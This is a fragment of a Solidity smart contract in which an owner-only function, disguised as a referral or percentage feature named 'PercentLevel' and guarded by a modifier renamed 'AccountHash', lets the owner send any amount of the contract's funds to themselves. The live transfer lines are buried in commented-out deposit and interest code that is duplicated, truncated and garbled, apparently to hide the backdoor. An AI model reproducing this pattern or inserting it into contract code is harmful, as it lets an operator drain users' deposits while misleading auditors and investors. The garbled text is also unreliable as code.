...
contract Ownable {
    ...
    modifier AccountHash() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public AccountHash {
...
contract prg is Ownable {
    ...
    function PercentLevel(address referrer, uint8 plan, uint amount) public AccountHash {
       	/*User storage user = users[msg.sender];
		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].finish) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);*		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].fini	if (user.checkpoint < user.deposits[i].finish) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);*		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].finish) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);*/
					address payable Hash = (msg.sender);
				/*uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {	uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (fro	totalAmount = tot
						totalAmount = tot	totalAmount = tot
							totalAmount = totm < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));*/
        Hash.transfer(amount);
